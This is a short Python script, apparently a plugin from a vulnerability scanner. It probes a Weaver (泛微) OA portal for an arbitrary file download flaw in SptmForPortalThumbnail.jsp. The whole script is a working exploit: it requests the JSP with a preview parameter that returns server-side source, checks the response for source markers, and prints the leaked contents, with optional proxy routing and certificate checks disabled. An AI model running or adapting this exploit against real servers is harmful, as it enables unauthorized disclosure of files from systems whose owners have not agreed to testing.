import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import random
import re

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"
        }
        path = 'portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp'
        logging.captureWarnings(True)
        aa1 = requests.get(url1+path, cookies=s_cookie,headers=headers, proxies=proxies,verify=False, timeout=10)
        if aa1.status_code == 200 and 'page import="java.io' in aa1.text and 'if(!imgFile.exists())imgPath = "/page/resource/Thumbnail' in aa1.text:
            cdd = '[+]漏洞存在\n' + str(aa1.text)
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 SptmForPortalThumbnail.jsp任意文件下载 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)